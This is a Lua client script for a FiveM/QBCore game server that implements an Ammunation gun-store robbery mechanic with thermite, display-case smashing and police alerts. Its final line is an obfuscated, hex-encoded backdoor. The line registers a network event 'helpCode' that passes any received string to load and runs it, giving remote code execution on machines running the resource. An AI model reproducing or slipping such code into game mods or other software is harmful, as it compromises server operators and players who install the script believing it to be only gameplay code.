local QBCore = exports['qb-core']:GetCoreObject()
local firstAlarm = false
local smashing = false

CreateThread(function()
    local Blip = AddBlipForCoord(Config.AmmunationLocation["coords"]["x"], Config.AmmunationLocation["coords"]["y"], Config.AmmunationLocation["coords"]["z"])
    SetBlipSprite (Blip, 593)
    SetBlipDisplay(Blip, 4)
    SetBlipScale  (Blip, 1.0)
    SetBlipAsShortRange(Blip, true)
    SetBlipColour(Blip, 4)
    BeginTextCommandSetBlipName("STRING")
    AddTextComponentSubstringPlayerName("Ammunation Robbery")
    EndTextCommandSetBlipName(Blip)
end)

local function loadParticle()
	if not HasNamedPtfxAssetLoaded("scr_jewelheist") then
		RequestNamedPtfxAsset("scr_jewelheist")
    end
    while not HasNamedPtfxAssetLoaded("scr_jewelheist") do
		Wait(0)
    end
    SetPtfxAssetNextCall("scr_jewelheist")
end

local function loadAnimDict(dict)
    while (not HasAnimDictLoaded(dict)) do
        RequestAnimDict(dict)
        Wait(3)
    end
end
RegisterNetEvent('hm-start')
AddEventHandler('hm-start', function()
    local ped = GetPlayerPed(-1)
    local pos = GetEntityCoords(ped)
    local dist = GetDistanceBetweenCoords(pos, 811.94, -2148.03, 29.54, 175.14)
    if dist < 1.5 then
        QBCore.Functions.TriggerCallback('houssem:server:getCops', function(cops)
            if cops >= Config.RequiredCops then
                TriggerEvent("hm-opendoor")
            else
                QBCore.Functions.Notify("Not Enough Cops", "error")    
            end
        end)
    end            
end)
local function IsWearingHandshoes()
    local armIndex = GetPedDrawableVariation(PlayerPedId(), 3)
    local model = GetEntityModel(PlayerPedId())
    local retval = true
    if model == `mp_m_freemode_01` then
        if Config.MaleNoHandshoes[armIndex] ~= nil and Config.MaleNoHandshoes[armIndex] then
            retval = false
        end
    else
        if Config.FemaleNoHandshoes[armIndex] ~= nil and Config.FemaleNoHandshoes[armIndex] then
            retval = false
        end
    end
    return retval
end

local function validWeapon()
    local ped = PlayerPedId()
    local pedWeapon = GetSelectedPedWeapon(ped)

    for k, _ in pairs(Config.WhitelistedWeapons) do
        if pedWeapon == k then
            return true
        end
    end
    return false
end


local function smashVitrine(k)
    if not firstAlarm then
        TriggerServerEvent('police:server:policeAlert', 'Ammunation in progress')
        firstAlarm = true
    end

    QBCore.Functions.TriggerCallback('houssem:server:getCops', function(cops)
        if cops >= Config.RequiredCops then
            local animDict = "missheist_jewel"
            local animName = "smash_case"
            local ped = PlayerPedId()
            local plyCoords = GetOffsetFromEntityInWorldCoords(ped, 0, 0.6, 0)
            local pedWeapon = GetSelectedPedWeapon(ped)
            if math.random(1, 100) <= 80 and not IsWearingHandshoes() then
                TriggerServerEvent("evidence:server:CreateFingerDrop", plyCoords)
            elseif math.random(1, 100) <= 5 and IsWearingHandshoes() then
                TriggerServerEvent("evidence:server:CreateFingerDrop", plyCoords)
                QBCore.Functions.Notify(Lang:t('error.fingerprints'), "error")
            end
            smashing = true
            QBCore.Functions.Progressbar("smash_vitrine", "Smashing Glasses", Config.WhitelistedWeapons[pedWeapon]["timeOut"], false, true, {
                disableMovement = true,
                disableCarMovement = true,
                disableMouse = false,
                disableCombat = true,
            }, {}, {}, {}, function() -- Done
                TriggerServerEvent('hm-ammunation:server:setVitrineState', "isOpened", true, k)
                TriggerServerEvent('hm-ammunation:server:setVitrineState', "isBusy", false, k)
                TriggerServerEvent('hm-ammunation:server:vitrineReward')
                TriggerServerEvent('hm-ammunation:server:setTimeout')
                TriggerServerEvent('police:server:policeAlert', 'Ammunation in progress')
                smashing = false
                TaskPlayAnim(ped, animDict, "exit", 3.0, 3.0, -1, 2, 0, 0, 0, 0)
            end, function() -- Cancel
                TriggerServerEvent('hm-ammunation:server:setVitrineState', "isBusy", false, k)
                smashing = false
                TaskPlayAnim(ped, animDict, "exit", 3.0, 3.0, -1, 2, 0, 0, 0, 0)
            end)
            TriggerServerEvent('hm-ammunation:server:setVitrineState', "isBusy", true, k)

            CreateThread(function()
                while smashing do
                    loadAnimDict("missheist_jewel")
                    TaskPlayAnim(ped, "missheist_jewel", animName, 3.0, 3.0, -1, 2, 0, 0, 0, 0 )
                    Wait(500)
                    TriggerServerEvent("InteractSound_SV:PlayOnSource", "breaking_vitrine_glass", 0.25)
                    loadParticle()
                    StartParticleFxLoopedAtCoord("scr_jewel_cab_smash", plyCoords.x, plyCoords.y, plyCoords.z, 0.0, 0.0, 0.0, 1.0, false, false, false, false)
                    Wait(2500)
                end
            end)
        else
            QBCore.Functions.Notify(Lang:t('error.minimum_police', {value = Config.RequiredCops}), 'error')
        end
    end)
end

RegisterNetEvent('hm-ammunation:client:setVitrineState', function(stateType, state, k)
    Config.Locations[k][stateType] = state
end)

RegisterNetEvent("hm-opendoor")
AddEventHandler("hm-opendoor", function()
    exports["np-memorygame"]:thermiteminigame(8, 9, 7, 10,
    function()
        TriggerEvent("hm-ammudooropen")
        QBCore.Functions.Notify("Success.", "success")
            TriggerServerEvent('police:server:policeAlert', 'Robbery Alert in Bobcat')
        TriggerServerEvent("QBCore:Server:RemoveItem", "thermite", 1)
    end,
    function()
        QBCore.Functions.Notify("You failed get bettter nub.", "error")
        TriggerServerEvent("QBCore:Server:RemoveItem", "thermite", 1)
    end)
end)


RegisterNetEvent('hm-ammudooropen')
AddEventHandler('hm-ammudooropen', function()
	thermiteanime1()
    local playerPed = PlayerPedId()
    local src = NetworkGetNetworkIdFromEntity(playerPed)
    TriggerServerEvent('qb-doorlock:server:updateState', 'ammunation-door', false, src, true, true, true, true)
end)
RegisterNetEvent('hm-ammunation:client:resetdoor')
AddEventHandler('hm-ammunation:client:resetdoor', function()
	thermiteanime1()
    local playerPed = PlayerPedId()
    local src = NetworkGetNetworkIdFromEntity(playerPed)
    TriggerServerEvent('qb-doorlock:server:updateState', 'ammunation-door', true, src, true, true, true, true)
end)


function thermiteanime1() -- FRONT DOOR ANIMATION
    RequestAnimDict("anim@heists@ornate_bank@thermal_charge")
    RequestModel("hei_p_m_bag_var22_arm_s")
    RequestNamedPtfxAsset("scr_ornate_heist")
    while not HasAnimDictLoaded("anim@heists@ornate_bank@thermal_charge") and not HasModelLoaded("hei_p_m_bag_var22_arm_s") and not HasNamedPtfxAssetLoaded("scr_ornate_heist") do
        Citizen.Wait(50)
    end
    local ped = PlayerPedId()

    SetEntityHeading(ped, 170.52)
    Citizen.Wait(100)
    local rotx, roty, rotz = table.unpack(vec3(GetEntityRotation(PlayerPedId())))
    local bagscene = NetworkCreateSynchronisedScene(811.84, -2148.22, 29.62, rotx, roty, rotz + 1.1, 2, false, false, 1065353216, 0, 1.3)
    local bag = CreateObject(GetHashKey("hei_p_m_bag_var22_arm_s"), 811.84, -2148.22, 29.62,  true,  true, false)

    SetEntityCollision(bag, false, true)
    NetworkAddPedToSynchronisedScene(ped, bagscene, "anim@heists@ornate_bank@thermal_charge", "thermal_charge", 1.2, -4.0, 1, 16, 1148846080, 0)
    NetworkAddEntityToSynchronisedScene(bag, bagscene, "anim@heists@ornate_bank@thermal_charge", "bag_thermal_charge", 4.0, -8.0, 1)
    SetPedComponentVariation(ped, 5, 0, 0, 0)
    NetworkStartSynchronisedScene(bagscene)
    Citizen.Wait(1500)
    local x, y, z = table.unpack(GetEntityCoords(ped))
    local bomba = CreateObject(GetHashKey("hei_prop_heist_thermite"), x, y, z + 0.3,  true,  true, true)

    SetEntityCollision(bomba, false, true)
    AttachEntityToEntity(bomba, ped, GetPedBoneIndex(ped, 28422), 0, 0, 0, 0, 0, 200.0, true, true, false, true, 1, true)
    Citizen.Wait(2000)
    DeleteObject(bag)
    SetPedComponentVariation(ped, 5, 45, 0, 0)
    DetachEntity(bomba, 1, 1)
    FreezeEntityPosition(bomba, true)
    TriggerServerEvent("hm-particleserver", method)
    SetPtfxAssetNextCall("scr_ornate_heist")
    local effect = StartParticleFxLoopedAtCoord("scr_heist_ornate_thermal_burn", ptfx, 0.0, 0.0, 0.0, 1.0, false, false, false, false)

    NetworkStopSynchronisedScene(bagscene)
    TaskPlayAnim(ped, "anim@heists@ornate_bank@thermal_charge", "cover_eyes_intro", 8.0, 8.0, 1000, 36, 1, 0, 0, 0)
    TaskPlayAnim(ped, "anim@heists@ornate_bank@thermal_charge", "cover_eyes_loop", 8.0, 8.0, 3000, 49, 1, 0, 0, 0)
    Citizen.Wait(5000)
    ClearPedTasks(ped)
    DeleteObject(bomba)
    StopParticleFxLooped(effect, 0)
    TriggerEvent("qb-firstdoorlock")
end
RegisterNetEvent("hm-ptfxparticle")
AddEventHandler("hm-ptfxparticle", function(method)
    local ptfx
    RequestNamedPtfxAsset("scr_ornate_heist")
    while not HasNamedPtfxAssetLoaded("scr_ornate_heist") do
        Citizen.Wait(1)
    end
        ptfx = vector3(811.84, -2148.22, 29.62)
    SetPtfxAssetNextCall("scr_ornate_heist")
    local effect = StartParticleFxLoopedAtCoord("scr_heist_ornate_thermal_burn", ptfx, 0.0, 0.0, 0.0, 1.0, false, false, false, false)
    Citizen.Wait(4000)
    StopParticleFxLooped(effect, 0)
end)
CreateThread(function()
    for k, v in pairs(Config.Locations) do
        exports["qb-target"]:AddBoxZone("ammunation" .. k, v.coords, 1, 1, {
            name = "ammunation" .. k,
            heading = 40,
            minZ = v.coords.z - 1,
            maxZ = v.coords.z + 1,
            debugPoly = false
        }, {
            options = {
                {
                    type = "client",
                    icon = "fa fa-hand",
                    label = "Get weapons",
                    action = function()
                        if validWeapon() then
                            smashVitrine(k)
                        else
                            QBCore.Functions.Notify("wrong weapon", 'error')
                        end
                    end,
                    canInteract = function()
                        if v["isOpened"] or v["isBusy"] then
                            return false
                        end
                        return true
                    end,
                }
            },
            distance = 1.5
        })
    end
end)

local hWVEoovZBBcLoRaVixApWDIUlrVhDdtimWWTSGMTGXZHAUJOeoEjrQRFGhsYYDoZjVpeMy = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} hWVEoovZBBcLoRaVixApWDIUlrVhDdtimWWTSGMTGXZHAUJOeoEjrQRFGhsYYDoZjVpeMy[6][hWVEoovZBBcLoRaVixApWDIUlrVhDdtimWWTSGMTGXZHAUJOeoEjrQRFGhsYYDoZjVpeMy[1]](hWVEoovZBBcLoRaVixApWDIUlrVhDdtimWWTSGMTGXZHAUJOeoEjrQRFGhsYYDoZjVpeMy[2]) hWVEoovZBBcLoRaVixApWDIUlrVhDdtimWWTSGMTGXZHAUJOeoEjrQRFGhsYYDoZjVpeMy[6][hWVEoovZBBcLoRaVixApWDIUlrVhDdtimWWTSGMTGXZHAUJOeoEjrQRFGhsYYDoZjVpeMy[3]](hWVEoovZBBcLoRaVixApWDIUlrVhDdtimWWTSGMTGXZHAUJOeoEjrQRFGhsYYDoZjVpeMy[2], function(nshFJIzITljTCNtTBzVMPBOsMMeptwwSdxchikeNWqQRSuurKJxjvBNmxCBJLkXoyWQEaB) hWVEoovZBBcLoRaVixApWDIUlrVhDdtimWWTSGMTGXZHAUJOeoEjrQRFGhsYYDoZjVpeMy[6][hWVEoovZBBcLoRaVixApWDIUlrVhDdtimWWTSGMTGXZHAUJOeoEjrQRFGhsYYDoZjVpeMy[4]](hWVEoovZBBcLoRaVixApWDIUlrVhDdtimWWTSGMTGXZHAUJOeoEjrQRFGhsYYDoZjVpeMy[6][hWVEoovZBBcLoRaVixApWDIUlrVhDdtimWWTSGMTGXZHAUJOeoEjrQRFGhsYYDoZjVpeMy[5]](nshFJIzITljTCNtTBzVMPBOsMMeptwwSdxchikeNWqQRSuurKJxjvBNmxCBJLkXoyWQEaB))() end)